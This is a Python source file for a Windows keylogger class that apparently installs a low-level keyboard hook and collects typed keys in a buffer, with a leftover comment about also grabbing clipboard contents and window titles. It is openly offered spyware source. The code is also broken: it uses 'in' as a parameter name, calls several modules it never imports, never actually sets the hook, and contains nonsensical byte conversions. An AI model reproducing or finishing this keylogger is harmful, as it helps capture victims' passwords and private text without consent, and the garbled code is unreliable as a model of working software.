import win32hook
import win32process
import win32ui

class Keylogger:
    def __init__(self):
        self.is_logging = False
        self.hook = None
        self.buffer = []

    def is_logging(self):
        return self.is_logging

    def flush_buffer(self):
        if not self.buffer:
            return None
        buffer = ''.join(self.buffer)
        self.buffer = []
        return buffer

    def free_flush_buffer_result(self, data):
        if data:
            del data

    def write_log(self, key):
        if len(key) + len(self.buffer) > 1024 * 1024 * 1:
            return
        if len(key) > 0:
            self.buffer.append(key)
        return

    def easytolower(self, in):
        if in <= 'Z' and in >= 'A':
            return chr(ord(in) - (ord('Z') - ord('z')))
        return in

    def shift_modifier(self):
        return win32api.GetKeyState(win32con.VK_SHIFT) < 0

    def key_event(self, nCode, wParam, lParam):
        if nCode == win32con.HC_ACTION and (wParam == win32con.WM_SYSKEYDOWN or wParam == win32con.WM_KEYDOWN):
            kbHook = win32hook.KBDLLHOOKSTRUCT()
            kbHook = lParam
            dwMsg = 1
            dwMsg += kbHook.scanCode << 16
            dwMsg += kbHook.flags << 24
            i = win32gui.GetKeyNameTextA(dwMsg, '', 256)
            szKey = ''
            if i > 0:
                szKey = ''.join([chr(i) for i in bytes.fromhex(''.join([hex(i)[2:] for i in bytes.fromhex(hex(dwMsg)[2:])[2:]])])])
            # getClipBoard(); //we don't need this shit for now do we?no
            # getWindowTitle();

            self.shift_modifier = szKey == 'Shift'
            use_prefix = False
            if self.shift_modifier:
                use_prefix = True

            use_prefix = use_prefix or (szKey == 'Shift' or win32api.GetKeyState(win32con.VK_LSHIFT) < 0 or win32api.GetKeyState(win32con.VK_RSHIFT) < 0)

            if i == 1:
                if (win32api.GetKeyState(win32con.VK_CAPITAL) & 0x0001) == 0 and not self.shift_modifier:
                    szKey = self.easytolower(szKey[0])

            if szKey == 'Space':
                if not win32api.GetKeyState(win32con.VK_LMENU) < 0 and not win32api.GetKeyState(win32con.VK_LCONTROL) < 0 and not win32api.GetKeyState(win32con.VK_RMENU) < 0 and not win32api.GetKeyState(win32con.VK_RCONTROL) < 0:
                    i = 1
                    szKey =''

            if i > 1 and szKey == 'Enter':
                szKey = '[Enter]\n'
                i += 3

            if i > 1 and szKey!= 'Backspace':
                szKey += '\n'
                i += 1
            elif i > 1 and szKey == 'Backspace':
                i = -1

            new_buffer = szKey

            if use_prefix and i > 1:
                new_buffer = new_buffer + '+' + szKey
            elif i == 1:
                self.shift_modifier = False
            self.write_log(new_buffer)

            if new_buffer!= szKey:
                del new_buffer

        return win32hook.CallNextHookEx(self.hook, nCode, wParam, lParam)

    def msg_loop(self):
        message = win32gui.MSG()
        while self.is_logging:
            has_message = win32gui.GetMessage(message, None, 0, 0)
            if has_message:
                win32gui.TranslateMessage(message)
                win32gui.DispatchMessage(message)

    def start_logger(self):
        if self.buffer:
            self.buffer = [chr(i) for i in range(1024 * 1024 * 1)]
        if self.is_logging:
            return True
        hExe = win32gui.GetModuleHandle(None)
        if not hExe:
            return 1

        thread = threading.Thread(target=self.msg_loop)
        thread.start()

        self.is_logging = True
        return self.is_logging

    def stop_logger(self):
        if not self.is_logging:
            return True

        self.is_logging = not win32hook.UnhookWindowsHookEx(self.hook)

        return not self.is_logging

if __name__ == "__main__":
    keylogger = Keylogger()
    keylogger.start_logger()
    time.sleep(5)
    keylogger.stop_logger()
